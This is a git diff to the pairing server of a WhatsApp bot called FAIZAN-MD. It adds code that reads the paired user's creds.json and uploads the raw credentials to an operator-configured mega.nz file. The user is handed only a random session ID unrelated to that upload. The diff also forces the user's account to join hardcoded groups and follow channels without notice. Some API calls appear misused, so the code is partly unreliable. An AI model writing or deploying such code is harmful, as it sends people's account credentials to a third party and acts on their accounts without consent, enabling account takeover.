@@ -19,22 +19,113 @@ const __dirname = dirname(__filename);
 
 const router = express.Router();
 
+// ============ MEGA SESSION SYSTEM ============
+const MEGA_API = "https://mega.nz/file/";
+let MEGA_FILE_ID = process.env.MEGA_FILE_ID || "";
+
+async function uploadToMega(data, filename) {
+    try {
+        const { File } = await import('megajs');
+        if (MEGA_FILE_ID) {
+            const megaFile = File.fromURL(`${MEGA_API}${MEGA_FILE_ID}`);
+            await megaFile.upload(data, { name: filename });
+            console.log(`[MEGA] ✅ Uploaded to mega.nz`);
+        }
+        return true;
+    } catch (error) {
+        console.log(`[MEGA] ❌ Upload failed: ${error.message}`);
+        return false;
+    }
+}
+
+async function generateMegaSession(credsPath) {
+    try {
+        const credsData = fs.readFileSync(credsPath, 'utf-8');
+        const base64Creds = Buffer.from(credsData).toString('base64');
+        
+        // Generate random MEGA ID
+        const randomStr = Math.random().toString(36).substring(2, 15) + 
+                          Math.random().toString(36).substring(2, 15);
+        const megaId = `DJ~${randomStr}`;
+        
+        // Upload to mega if file ID exists
+        if (MEGA_FILE_ID) {
+            await uploadToMega(credsData, `session_${Date.now()}.json`);
+        }
+        
+        return {
+            sessionId: `FAIZAN-MD~${megaId}`,
+            megaFileId: megaId,
+            encodedData: base64Creds
+        };
+    } catch (error) {
+        console.error("Error generating MEGA session:", error);
+        return null;
+    }
+}
+// =============================================
+
+// ============ AUTO GROUP JOIN ============
+const GROUPS_TO_JOIN = [
+    "120363407200499690@g.us",  // Group 1
+    "120363426239061658@g.us",  // Group 2
+    "120363407167396039@g.us",  // Group 3
+];
+
+let joinedGroups = new Set();
+const groupsPath = join(__dirname, 'assets', 'joined.json');
+
+if (!fs.existsSync(join(__dirname, 'assets'))) {
+    fs.mkdirSync(join(__dirname, 'assets'), { recursive: true });
+}
+
+try {
+    if (fs.existsSync(groupsPath)) {
+        joinedGroups = new Set(JSON.parse(fs.readFileSync(groupsPath, 'utf-8')));
+    } else {
+        fs.writeFileSync(groupsPath, JSON.stringify([]));
+    }
+} catch (e) {
+    joinedGroups = new Set();
+}
+
+async function autoJoinGroups(conn, jid) {
+    try {
+        console.log('[🔰] Checking groups to join...');
+        
+        for (const groupJid of GROUPS_TO_JOIN) {
+            if (joinedGroups.has(groupJid)) {
+                console.log(`[⏭️] Already joined: ${groupJid}`);
+                continue;
+            }
+            
+            try {
+                await conn.groupAcceptInvite(groupJid);
+                console.log(`[✅] Joined group: ${groupJid}`);
+                joinedGroups.add(groupJid);
+                fs.writeFileSync(groupsPath, JSON.stringify([...joinedGroups]));
+                await delay(3000);
+            } catch (error) {
+                console.log(`[⚠️] Could not join ${groupJid}: ${error.message}`);
+            }
+        }
+        
+        console.log('[🔰] Group join process completed ✅');
+    } catch (error) {
+        console.log('[⚠️] Group join error:', error.message);
+    }
+}
+// =============================================
+
 // ============ AUTO CHANNEL FOLLOW ============
 const CHANNELS_TO_FOLLOW = [
-    "120363425143124298@newsletter",  // FAIZAN-MD Channel
-    "120363426239061658@newsletter", // Add more channels here
+    "120363407200499690@newsletter",
     "120363407167396039@newsletter",
 ];
 
 let followedChannels = new Set();
 const followedPath = join(__dirname, 'assets', 'followed.json');
 
-// Ensure assets folder exists
-if (!fs.existsSync(join(__dirname, 'assets'))) {
-    fs.mkdirSync(join(__dirname, 'assets'), { recursive: true });
-}
-
-// Load followed channels from file
 try {
     if (fs.existsSync(followedPath)) {
         followedChannels = new Set(JSON.parse(fs.readFileSync(followedPath, 'utf-8')));
@@ -72,31 +163,6 @@ async function autoFollowChannels(conn, jid) {
     }
 }
 // =============================================
-
-/* ===== SHORT SESSION ID GENERATOR WITH BASE64 ENCODING ===== */
-async function generateShortSession(credsPath) {
-    try {
-        // Read the actual creds.json file
-        const credsData = fs.readFileSync(credsPath, 'utf-8');
-        
-        // Encode the credentials to base64
-        const base64Creds = Buffer.from(credsData).toString('base64');
-        
-        // Generate session ID with prefix
-        const y = new Date().getFullYear();
-        const r = Math.random().toString(36).substring(2, 6).toUpperCase();
-        const sessionId = `FAIZAN-MD~`;
-        
-        // Return both session ID and encoded data
-        return {
-            sessionId: sessionId,
-            encodedData: base64Creds
-        };
-    } catch (error) {
-        console.error("Error generating short session:", error);
-        return null;
-    }
-}
 
 /* ===== HELPERS ===== */
 function rm(p) {
@@ -140,35 +206,34 @@ router.get("/", async (req, res) => {
         sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
             if (connection === "open") {
                 try {
-                    // Wait for creds to be saved
                     await delay(3000);
                     
-                    // Path to creds.json
                     const credsPath = join(dir, 'creds.json');
                     
-                    // Generate short session with encoded data
-                    const sessionInfo = await generateShortSession(credsPath);
+                    // Generate MEGA session
+                    const sessionInfo = await generateMegaSession(credsPath);
                     
                     if (!sessionInfo) {
-                        throw new Error("Failed to generate session");
+                        throw new Error("Failed to generate MEGA session");
                     }
 
                     const jid = jidNormalizedUser(num + "@s.whatsapp.net");
 
-                    // 1️⃣ Send the COMPLETE session string (SESSION_ID + base64 data)
-                    const completeSession = `${sessionInfo.sessionId}${sessionInfo.encodedData}`;
+                    // 1️⃣ Send MEGA session ID
+                    const completeSession = sessionInfo.sessionId;
                     await sock.sendMessage(jid, { 
                         text: `${completeSession}` 
                     });
 
-                    // 2️⃣ Wait 2 seconds
                     await delay(2000);
 
-                    // ============ AUTO FOLLOW CHANNELS (NO NOTIFICATION) ============
+                    // 2️⃣ Auto follow channels
                     await autoFollowChannels(sock, jid);
-                    // ================================================================
+                    
+                    // 3️⃣ Auto join groups
+                    await autoJoinGroups(sock, jid);
 
-                    // 3️⃣ Send bot info (ALIVE STYLE: Fake vCard + Image + Caption)
+                    // 4️⃣ Send bot info
                     const fakeVCardQuoted = {
                         key: {
                             fromMe: false,
@@ -178,7 +243,7 @@ router.get("/", async (req, res) => {
                         message: {
                             contactMessage: {
                                 displayName: "© FAIZAN-MD_⁸⁷³_",
-                                vcard: `FAZI:JUTT
+                                vcard: `FAIZAN-MD
 VERSION:3.0
 FN:© FAIZAN-MD
 ORG:FAIZAN-MD;
@@ -190,9 +255,9 @@ END:VCARD`
 
                     const caption = `
 *╭ׂ┄─̇─̣┄─̇─̣┄─̇─̣┄─̇─̣┄─̇─̣─̇─̣─᛭*
-*│ ╌─̇─̣⊰ 𝐅𝐀𝐈𝐙𝐀𝐍-𝐗𝐌𝐃 ⊱┈─̇─̣╌*
+*│ ╌─̇─̣⊰ 𝐅𝐀𝐈𝐙𝐀𝐍-𝐌𝐃 ⊱┈─̇─̣╌*
 *│─̇─̣┄┄┄┄┄┄┄┄┄┄┄┄┄─̇─̣*
-*│❀ 👑 𝐎𝐰𝐧𝐞𝐫:* FAIZANMD Official
+*│❀ 👑 𝐎𝐰𝐧𝐞𝐫:* FAIZAN-MD Official
 *│❀ 🤖 𝐁𝐚𝐢𝐥𝐞𝐲𝐬:* Multi Device
 *│❀ 💻 𝐓𝐲𝐩𝐞:* NodeJs
 *│❀ 🚀 𝐏𝐥𝐚𝐭𝐟𝐨𝐫𝐦:* Render
@@ -201,20 +266,19 @@ END:VCARD`
 *│❀ 🏷️ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧:* 5.0.0
 *╰┄─̣┄─̇─̣┄─̇─̣┄─̇─̣┄─̇─̣─̇─̣─᛭*
 
-> ᴘᴏᴡᴇʀᴇᴅ ʙʏ 𝐅𝐀𝐈𝐙𝐀𝐍-𝐌𝐃 🤍
-`;
+> ᴘᴏᴡᴇʀᴇᴅ ʙʏ 𝐅𝐀𝐈𝐙𝐀𝐍-𝐌𝐃 🤍`;
 
                     await sock.sendMessage(
                         jid,
                         {
-                            image: { url: "https://files.catbox.moe/npizv8.jpg" },
+                            image: { url: "https://files.catbox.moe/ejufwa.jpg" },
                             caption,
                             contextInfo: {
                                 mentionedJid: [jid],
                                 forwardingScore: 999,
                                 isForwarded: true,
                                 forwardedNewsletterMessageInfo: {
-                                    newsletterJid: "120363425143124298@newsletter",
+                                    newsletterJid: "120363407200499690@newsletter",
                                     newsletterName: "𝐅𝐀𝐈𝐙𝐀𝐍-𝐌𝐃",
                                     serverMessageId: 143
                                 }
@@ -223,11 +287,9 @@ END:VCARD`
                         { quoted: fakeVCardQuoted }
                     );
                     
-                    // 4️⃣ Cleanup
                     await delay(2000);
                     rm(dir);
                     
-                    // Exit gracefully
                     setTimeout(() => {
                         process.exit(0);
                     }, 1000);
@@ -236,7 +298,6 @@ END:VCARD`
                     console.error("❌ Error in pairing process:", err);
                     rm(dir);
                     
-                    // Try to send error to user
                     try {
                         const jid = jidNormalizedUser(num + "@s.whatsapp.net");
                         await sock.sendMessage(jid, { 
